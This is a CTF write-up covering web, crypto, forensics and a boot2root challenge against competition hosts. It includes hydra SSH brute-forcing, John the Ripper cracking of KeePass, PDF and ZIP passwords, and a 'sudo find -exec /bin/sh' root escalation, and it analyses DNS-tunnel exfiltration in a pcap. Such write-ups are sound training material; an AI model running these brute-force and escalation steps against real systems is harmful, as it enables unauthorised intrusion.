---
title: I&M InterUniversity CTF 
author: Bonface
date: 2025-10-09 00:00:00 +0000
categories:
  - CTF Competitions
tags:
  - web
  - linux
  - Misc
  - Cryptography
  - Network Forensics
  - symlinks
image:
  path: /assets/img/CTF_Competitions/inmctf/inmctf.jpg
  alt: inmctf
---

Hello everyone! 👋 I'm Sh3rl0ck, and I'm excited to share my writeup for the recent I&M InterUniversity CTF . This competition had a great mix of challenges, pushing me to rely on core cybersecurity principles like information gathering, reverse engineering, and deep forensics analysis.

Here are the step-by-step solutions for the challenges I tackled.  

# Web
## Simple Web...
**Challenge Description** :  
``` 
Welcome to possibly the simplest web challenge you’ll ever face... or so it seems.   
There’s no need for deep exploits or fancy payloads here — just some good old-fashioned information gathering.  

Your mission? _**Explore. Observe. Discover.**_  

Sometimes, the secrets aren’t hidden behind complex login forms or obscure endpoints — they’re simply tucked away, politely asking bots to ignore them.   
If you were a search engine crawler, where would you be told not to go?  
```
This was a straightforward information gathering challenge, a great warm-up!



We are given an ip address and visiting the site we get :   
![](/assets/img/CTF_Competitions/inmctf/i&mBank-homepage.png)

Nothing much on the home page, but the source code has :   
```html
<!-- Second part the of the flag: _source_code_ -->
```

We visit the `robots.txt` file : 
```bash
curl http://172.236.13.98:8001/robots.txt
User-agent: *<br><br>
Disallow: /hidden_flag.txt<br><br>
Disallow: /secret/admin.html<br><br>

```

We get two paths : 
- `http://172.236.13.98:8001/hidden_flag.txt`
```bash
curl http://172.236.13.98:8001/hidden_flag.txt
Wow that was fast!!!!<br><br>
Congratulations!!!!!!<br><br>
first part of the flag : inm{robots_txt<br><br>
Did you also check the source code comments

```

- `http://172.236.13.98:8001/secret/admin.html`  

![](/assets/img/CTF_Competitions/inmctf/i&mBank-lastpart.png)

Compiling the flag we get.

```
inm{robots_txt_source_code_file_discovery} 
```

## The Oversharer
**Challenge Description** : 
```
web info-disclosure
Checkout our insecure website [http://172.236.13.98:8888/](http://172.236.13.98:8888/)

Signed up? Good. I know the site’s on [http://172.236.13.98:8888/](http://172.236.13.98:8888/) now poke around and listen to what the server can’t keep to itself.  
Find among the emails it blurts out — that’s your flag.
```

This challenge focused on information disclosure through intercepted network traffic.



We visit the site : 
![](/assets/img/CTF_Competitions/inmctf/i&mBank-TheSite.png)

Since we don't have an account, create one and login.
![](/assets/img/CTF_Competitions/inmctf/i&mBank-Login.png)

The interesting tab is the community tab since it displays all the users and also the content that they posted.  
Capturing the request using burp suite we get more details on the use specifically this user whose email stands out.
```json
    {
      "id": "DPonPMPooeKd4KxyAvLZi3",
      "title": "Browser abstraction",
      "content": "The page only shows the highlight reel the real story is in the exchange behind the scenes.",
      "author": {
        "nickname": "Mr Robot",
        "email": "inmctfchampionship@imbank.co.ke",
        "vehicleid": "",
        "profile_pic_url": "",
        "created_at": "2025-10-01T03:23:08.139Z"
      },
      "comments": [],
      "authorid": 8,
      "CreatedAt": "2025-10-01T03:23:08.139Z"
    },
```

The email format matched the expected flag type for this challenge.

```
inmctfchampionship@imbank.co.ke
```
# Crypto
## SIGHT IT
**Challenge Description** :  
``` 
Often important messages are hidden from people in conversions that look normal.  
Help me get the hidden message and capture the flag.  
```

We download the file : `message.txt` and read its content.  

```
cat message.txt 

Find the hidden message within these lines.
Life is full of secret communications.
Any keen observer might discover them.
Great puzzles often hide in plain sight.
{Sometimes the most obvious hiding spots are overlooked.}
Help yourself by examining the patterns carefully.
In forensics, details matter tremendously.
Detect what others might miss completely.
Discovering secrets requires patience and thoroughness.
Each line contributes to the overall message.
Never ignore what seems ordinary or mundane.

Important evidence can be hidden anywhere.
Nothing is ever as simple as it appears.

Plain text files are common vehicles for steganography.
Look beyond the content to find the structure.
Always check if patterns emerge from nowhere.
Information hides in the most unexpected places.
Notice how seemingly random elements might connect.

Solving puzzles like this requires methodical thinking.
Investigation skills are crucial in cybersecurity.
Great analysts know to check every possibility.
Hidden messages might be easier to spot than you think.
The art of concealment has many techniques.

```

The first letters of each non-empty line spell the secret.

```
# The first letters spell out
FLAG{HIDDENINPLAINSIGHT}

# Applying the correct flag formatting:
FLAG{HIDDEN_IN_PLAIN_SIGHT}
```

## Not_Secret
**Challenge Description** :   
```
Have you ever seen a .txt file with secrets? Now you have.
```

Downloading the given file we get its a `Keepass password database`
```
secret.txt: Keepass password database 2.x KDBX
```

Trying to read the database we get that we need a `pass`
```bash
kpcli -kdb secret.txt 
Provide the master password: *************************
Couldn't load the file secret.txt

Error(s) from File::KeePass:
Missing pass

```

To crack the file password will use `keepass2john` to create a hash that we can use john to crack.
```bash
keepass2john secret.txt > secrethash
```

We crack to get : 
```bash
john secrethash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (secret.txt)     
1g 0:00:01:33 DONE (2025-10-04 22:35) 0.01074g/s 14.95p/s 14.95c/s 14.95C/s jesse..atlanta
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Then use the password to open the db.

```bash
kpcli -kdb secret.txt 
# Provide the master password: password123

kpcli:/> show 0 # Index 0 was the Admin Panel entry

 Path: /secret/
Title: Admin Panel
Uname: admin
 Pass: adminAccess2024
  URL: 
Notes:  inm{passw0rds_are_keys}

```

And that's how we get the flag 
```
inm{passw0rds_are_keys}
```
## Silent Guardian
```
A disgruntled employee got sloppy with their personal finances—and left a bank statement exposed on the corporate file share. The file is password-protected, but maybe you can find another way in.  

This could be our breakthrough to tracing the accomplices to their malice, can you hack through?
```
This involved two steps: cracking the PDF password and then finding the hidden flag within the document.



Similar to the last challenge, I converted the PDF password to a hash using pdf2john and cracked it with John the Ripper.


```bash
# Convert to a format that john can understand
pdf2john Bank_Statement.pdf > BankHash

# crack using john
john BankHash
```
Once opened, the statement looked normal, but the hint mentioned a "super simple crack... then highlight the whole text to get the flag." This pointed to a hidden layer or text rendered in the same color as the background. Highlighting the entire text in the PDF viewer revealed the flag.

```
flag{inm_free_bank_to_mpesa_transactions}
```


# Miscellaneous

## Android App Reversing
```
Use basic reverse engineering techniques and methodologies to reverse and solve the following android apk challenge by determining the hidden flag.
```
For a simple flag hidden in an APK, the fastest method is often static analysis using the strings utility, which extracts printable character sequences from binary files.

```bash
# use strings
strings ctf-app.apk | grep "flag{"
flag{static_analysis_basics}

```

## Get Git Misconfig
**Challenge Description** :  
``` 
The DevSecOps team left behind a deployment configuration. A password-protected zip file holds the key.  
```

The password was hidden in a bash script, get_zip_password.sh, which contained an obfuscated echo command using hex-encoded characters.

```bash
ls
get_zip_password.sh  protected.zip

```

Contents of the `password.sh` file  :
```bash
cat get_zip_password.sh 
#!/bin/bash
eval "$(echo -e '\x65\x63\x68\x6f\x20\x50\x61\x73\x73\x77\x30\x72\x64\x21\x21')"

```

Execute the bash file to get the password.
Password : `Passw0rd!!`

Use the password to unzip the zip file.
```sh
unzip protected.zip 
Archive:  protected.zip
[protected.zip] github__ci.yml password: 
  inflating: github__ci.yml  
```

The `github__ci.yml` file contained an environment variable holding the flag:


```yml
stages:
  - build
  - deploy

variables:
  SECRET_KEY: inm{You'rectfchampion}

build_job:
  stage: build
  script:
    - echo "Building the project..."
    - echo $SECRET_KEY > build_artifacts/secret.txt
  artifacts:
    paths:
      - build_artifacts/
    expire_in: 1 week

deploy_job:
  stage: deploy
  script:
    - echo "Deploying..."
    - bash deploy.sh $SECRET_KEY

```

Flag : `inm{You'rectfchampion}`
## Housekeeping
```
Whether this is your very first stop or you’ve already tangled with a few challenges, let’s pause for a little housekeeping.

Have you swept through the rules of this CTF carefully? They might contain the secret you seek... or maybe they’re just dusty words you scrolled past too quickly 🤖.

Did you read them? Did you really read them?
`http://84.247.181.136:8051/rules`
```


The challenge was a blatant hint to check the source of the rules page.

```
flag{inm_read_and_follow_the_rules}

```

# Boot2root : System Breach
 
This was a challenging three-part journey involving initial access, lateral movement, and privilege escalation.

The initial investigation involved checking common hidden endpoints, leading to login.php.




Visiting the site we get `apache` default page but directory fuzzing does get us a `login.php` page.
![the sitr](https://gist.github.com/user-attachments/assets/6d4c3f37-82b6-4cd3-8129-ef633f6185ef)

Visiting the two pages we get : 
```bash
 curl http://172.236.22.187/login.php?page=filename.php
<h2>File Viewer</h2>

curl http://172.236.22.187/login.php?page=welcome.txt
<h2>File Viewer</h2>Welcome to our secure file viewer!

username: ctf_user ##user is on the server

password : ##rockyou can help

```

The file viewer's welcome.txt showed default credentials: username: `ctf_user` and a hint that `rockyou` could help with the password. This pointed directly to a **brute-force attack** against the SSH service.

```bash
# Brute-force the first user
hydra -l ctf_user -P /usr/share/wordlists/rockyou.txt ssh://172.236.22.187
# Cracked Password: myspace

```

ssh in as the user with the password.  
```bash
# SSH in and find the first flag
ssh ctf_user@172.236.22.187
ctf_user@localhost:~$ cat flag1.txt 
```

Flag 1:  
```
CTF{inm_Brut3f0rc3_4cc3ss}
```

2. Lateral Movement & Flag 2  
The `.next_step.txt` file suggested lateral movement by checking for other users.

```bash
ctf_user@localhost:~$ cat /etc/passwd | grep sh$
# ...
admin_user:x:1001:1001:,,,:/home/admin_user:/bin/bash
```
I repeated the brute-force attack for the new user, `admin_user`.


```bash
# Brute-force the second user
hydra -l admin_user -P /usr/share/wordlists/rockyou.txt ssh://172.236.22.187
# Cracked Password: sunshine

# SSH in and find the second flag
ssh admin_user@172.236.22.187
admin_user@localhost:~$ cat flag2.txt 

```


Flag 2:
```
CTF{inm_3xpl01t_4nd_l4t3r4l_m0v3m3nt}
```


3. Privilege Escalation & Flag 3
The `.escalate.txt` file pointed towards Privilege Escalation using `sudo -l`.

```bash
admin_user@localhost:~$ sudo -l
Matching Defaults entries for admin_user on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin_user may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/less, /usr/bin/vim, /usr/bin/find
admin_user@localhost:~$ 

```

we can run find as root
```bash
sudo find . -exec /bin/sh \; -quit
```

We get : 
```bash
admin_user@localhost:~$ sudo find . -exec /bin/sh \; -quit
# who ami
# whoami
root
# id 
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag3.txt	
```
Flag 3:
```
CTF{r00t_3sc4l4t10n_c0mpl3t3_m4st3r_h4ck3r}
```


# Network Forensics
## The Lost Transaction Ledger
```
During a routine audit of I&M Bank's wire transfer system, we intercepted suspicious UDP traffic. The packets appear to contain corrupted transaction logs mixed with random noise.  

Our analysts suspect hidden data exfiltration—can you reconstruct the original message?    
Note: Sometimes, the order of events with time reveals more than the content itsel  
```

The key here was the note about time and order. The data was being exfiltrated one byte at a time in the UDP payload.


1. Extracting and Ordering Data
I used `tshark` to extract the UDP payload data and sort the packets based on their epoch timestamp (`frame.time_epoch`), which ensures the data is reconstructed in the correct transmission order.

```sh
# Extract epoch time and UDP payload data, sort numerically by time
tshark -r wireshark_challenge_easy.pcap -Y "udp" -T fields -e frame.time_epoch -e data.data | sort -n | cut -f2 | xxd -r -p 

```
2. Alternative Wireshark Method
Alternatively, using Wireshark, filtering for `udp` and observing the tiny payloads from the source IP (`192.168.1.100`), I could manually follow the stream, noting the single-byte hex payload of each packet.


```
66 6c 61 67 7b 77 33 6c 63 30 6d 33 5f 74 30 5f 31 6d 62 61 6e 6b 5f 77 31 72 33 73 68 61 72 6b 7d
```

ASCII:
flag : `flag{w3lc0m3_t0_1mbank_w1r3shark}` ✅


## Catch if you Can
```
I am simple. Just find me.
```
Filtering for successful HTTP responses (`http.response.code == 200`) and looking for unusual data often reveals hidden clues. In this case, `tshark` revealed base64 encoded strings in the data.

```bash
tshark -r flag.pcap -Y"http.response.code == 200" -V | grep "Line-based text data" -A1 | grep -v "Line-based text data" | tr -d " " 

b2theSBpIHRyaWNrZWQgeW91IGFtIG5vdCAgdGhlIGZsYWcgYnV0IHRoZSBmbGFnIGlzIG9uICJPTllPVVJTSURFIgo=\n
--
d2VsbCBpIGFtIG5vdCAib255b3Vyc2lkZSI=\n
--
aW5te2lhbmRtX3dlX2FyZV9vbl95b3VyX3NpZGV9Cg==\n
--
aW5te2lhbmRtX3dlX2FyZV9vbl95b3VyX3NpZGV9Cg==\n

```

Decoding the base64 encoded characters.
```bash
echo "aW5te2lhbmRtX3dlX2FyZV9vbl95b3VyX3NpZGV9Cg==" | base64 -d
inm{iandm_we_are_on_your_side}

echo "d2VsbCBpIGFtIG5vdCAib255b3Vyc2lkZSI=" | base64 -d
well i am not "onyourside"


echo "b2theSBpIHRyaWNrZWQgeW91IGFtIG5vdCAgdGhlIGZsYWcgYnV0IHRoZSBmbGFnIGlzIG9uICJPTllPVVJTSURFIgo=" | base64 -d
okay i tricked you am not  the flag but the flag is on "ONYOURSIDE"


echo "b2theSBpIHRyaWNrZWQgeW91IGFtIG5vdCAgdGhlIGZsYWcgYnV0IHRoZSBmbGFnIGlzIG9uICJPTllPVVJTSURFIgo=" | base64 -d
okay i tricked you am not  the flag but the flag is on "ONYOURSIDE"

```

## DNS Data Heist
```
The IMBank cybersecurity team detected suspicious DNS traffic from an internal workstation.   
Forensic analysis suggests an attacker **exfiltrated sensitive data** by hiding it in DNS queries to a rogue server.
```

This is a classic example of DNS tunneling where data is encoded and sent as subdomains in DNS queries. The domain `exfil.badactor.com` in the pcap was the giveaway.


1. Extraction and Reassembly
I used `tshark` to filter DNS queries, specifically looking for the rogue domain. I then isolated the exfiltrated subdomain segments, sorted them by their sequence number (likely the structure of the data), and finally decoded the base64.

```sh
# For loop to extract the subdomains, isolate the base64 string, and decode

for i in $(tshark -r dns_exfil_challenge.pcap -Y"dns" | grep "exfil.badactor.com" | awk -F " " '{print $12}' | sort | awk -F "." '{print $1}' | awk -F "-" '{print $2}'); do echo "$i" | base64 -d;done

```
Flag : 
```
flag{dNs_tunN3l1ng_1s_a_c0mm0n_exf1l_m3th0d}
```

## The Midnight Bank Heist
```
The First Digital Bank has been breached! A cunning insider has smuggled out a critical file—hidden in a password-locked vault (ZIP) and exfiltrated through seemingly normal network traffic.  

But beware: the attacker has masked their theft in a flood of fake HTTP visits and DNS queries.  
Can you follow the digital breadcrumbs and stop the heist?  
```

This combined network forensics with password cracking. The goal was to extract a hidden ZIP file and then crack its password.


following the packets in wireshark we get a zip file that contains the flag.txt file in it thus we save it to our local machine.
```sh
file exif.zip 
exif.zip: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Aug 06 2025 06:37:10, uncompressed size 64, method=AES Encrypted
```

The file was protected with AES encryption, requiring a crack.  
```sh
# Convert to a format that john can understand
zip2john exif.zip > ziphash

# Crack using John
john ziphash -w=/usr/share/wordlists/rockyou.txt 
# Cracked Password: *27670*bank* ```

The cracked password was **`*27670*bank*`**.

### 3. Final Flag Retrieval
Using the recovered password, I successfully unzipped the file, which contained `flag.txt`.

```sh
# Unzip the file
unzip exif.zip 
# ... provide password ...

# Read the flag
cat exif/flag.txt 
```

Flag :  
```
CTF{Imbank_You_Found_The_Exfiltrated_Flag_And_Cracked_The_Hash!}
```


That concludes my writeup for the I&M InterUniversity CTF. A big thank you to the organizers for putting together a fun and educational competition! Feel free to reach out if you have any questions about the techniques used.